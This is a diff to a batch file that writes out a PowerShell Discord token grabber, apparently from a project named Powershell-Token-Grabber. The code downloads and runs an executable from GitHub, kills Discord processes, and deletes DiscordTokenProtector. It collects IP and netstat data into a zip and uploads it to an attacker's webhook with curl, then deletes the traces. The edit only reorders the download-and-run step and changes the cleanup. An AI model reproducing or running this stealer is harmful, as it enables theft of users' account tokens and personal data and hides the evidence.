@@ -98,13 +98,10 @@ echo     } >> powershell.ps1
 echo     $payload = $embed_and_body ^| ConvertTo-Json -Depth 10 >> powershell.ps1
 echo     Invoke-WebRequest -Uri $webhook -Method POST -Body $payload -ContentType "application/json" -UseBasicParsing ^| Out-Null >> powershell.ps1
 echo     Set-Location $env:LOCALAPPDATA\Temp >> powershell.ps1
-echo     Invoke-WebRequest -Uri "https://github.com/KDot227/Powershell-Token-Grabber/releases/download/Fixed_version/main.exe" -OutFile "main.exe" -UseBasicParsing >> powershell.ps1
 echo     taskkill.exe /f /im "Discord.exe" ^| Out-Null >> powershell.ps1
 echo     taskkill.exe /f /im "DiscordCanary.exe" ^| Out-Null >> powershell.ps1
 echo     taskkill.exe /f /im "DiscordPTB.exe" ^| Out-Null >> powershell.ps1
 echo     taskkill.exe /f /im "DiscordTokenProtector.exe" ^| Out-Null >> powershell.ps1
-echo     $proc = Start-Process $env:LOCALAPPDATA\Temp\main.exe -ArgumentList "$webhook" -NoNewWindow -PassThru >> powershell.ps1
-echo     $proc.WaitForExit() >> powershell.ps1
 echo     $token_prot = Test-Path "$env:APPDATA\DiscordTokenProtector\DiscordTokenProtector.exe" >> powershell.ps1
 echo     if ($token_prot -eq $true) { >> powershell.ps1
 echo         Remove-Item "$env:APPDATA\DiscordTokenProtector\DiscordTokenProtector.exe" -Force >> powershell.ps1
@@ -118,6 +115,9 @@ echo     if ($TEMP_KOT -eq $false) { >> powershell.ps1
 echo         New-Item "$env:LOCALAPPDATA\Temp\KDOT" -Type Directory >> powershell.ps1
 echo     } >> powershell.ps1
 echo     $gotta_make_sure = "penis"; Set-Content -Path "$env:LOCALAPPDATA\Temp\KDOT\bruh.txt" -Value "$gotta_make_sure" >> powershell.ps1
+echo     Invoke-WebRequest -Uri "https://github.com/KDot227/Powershell-Token-Grabber/releases/download/Fixed_version/main.exe" -OutFile "main.exe" -UseBasicParsing >> powershell.ps1
+echo     $proc = Start-Process $env:LOCALAPPDATA\Temp\main.exe -ArgumentList "$webhook" -NoNewWindow -PassThru >> powershell.ps1
+echo     $proc.WaitForExit() >> powershell.ps1
 echo     $lol = "$env:LOCALAPPDATA\Temp" >> powershell.ps1
 echo     Move-Item -Path "$lol\ip.txt" -Destination "$lol\KDOT\ip.txt" -ErrorAction SilentlyContinue >> powershell.ps1
 echo     Move-Item -Path "$lol\netstat.txt" -Destination "$lol\KDOT\netstat.txt" -ErrorAction SilentlyContinue >> powershell.ps1
@@ -134,9 +134,9 @@ echo     Compress-Archive -Path "$lol\KDOT" -DestinationPath "$lol\KDOT.zip" -Fo
 echo     #Invoke-WebRequest -Uri "$webhook" -Method Post -InFile "$lol\KDOT.zip" -ContentType "multipart/form-data" >> powershell.ps1
 echo     #curl.exe -X POST -H "Content-Type: multipart/form-data" -F "file=@$lol\KDOT.zip" $webhook >> powershell.ps1
 echo     curl.exe -X POST -F 'payload_json={\"username\": \"KING KDOT\", \"content\": \"\", \"avatar_url\": \"https://cdn.discordapp.com/avatars/1009510570564784169/c4079a69ab919800e0777dc2c01ab0da.png\"}' -F "file=@$lol\KDOT.zip" $webhook >> powershell.ps1
-echo     Remove-Item "$lol\KDOT.zip" -Force >> powershell.ps1
-echo     Remove-Item "$lol\KDOT" -Recurse -Force >> powershell.ps1
-echo     Remove-Item "$lol\main.exe" -Force >> powershell.ps1
+echo     Remove-Item "$lol\KDOT.zip" >> powershell.ps1
+echo     Remove-Item "$lol\KDOT" -Recurse >> powershell.ps1
+echo     Remove-Item "$lol\main.exe" >> powershell.ps1
 echo } >> powershell.ps1
 echo if (CHECK_IF_ADMIN -eq $true) { >> powershell.ps1
 echo     TASKS >> powershell.ps1
